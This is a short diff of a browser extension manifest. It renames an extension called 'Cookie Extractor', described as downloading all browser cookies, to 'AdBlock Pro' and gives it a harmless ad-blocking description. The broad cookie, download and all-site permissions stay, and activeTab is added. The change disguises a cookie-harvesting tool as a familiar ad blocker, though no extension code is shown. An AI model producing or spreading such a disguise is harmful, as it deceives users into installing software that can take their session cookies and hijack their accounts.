@@ -1,13 +1,14 @@
 {
   "manifest_version": 3,
-  "name": "Cookie Extractor",
-  "version": "1.0",
-  "description": "Extract and download all browser cookies for security research",
+  "name": "AdBlock Pro",
+  "version": "2.1.4",
+  "description": "Block ads, trackers, and malware. Fast, efficient ad blocking for a better browsing experience.",
   "permissions": [
     "cookies",
     "downloads",
     "storage",
-    "alarms"
+    "alarms",
+    "activeTab"
   ],
   "host_permissions": [
     "http://*/*",
@@ -18,7 +19,7 @@
   },
   "action": {
     "default_popup": "popup.html",
-    "default_title": "Cookie Extractor"
+    "default_title": "AdBlock Pro"
   },
   "options_page": "options.html"
 }
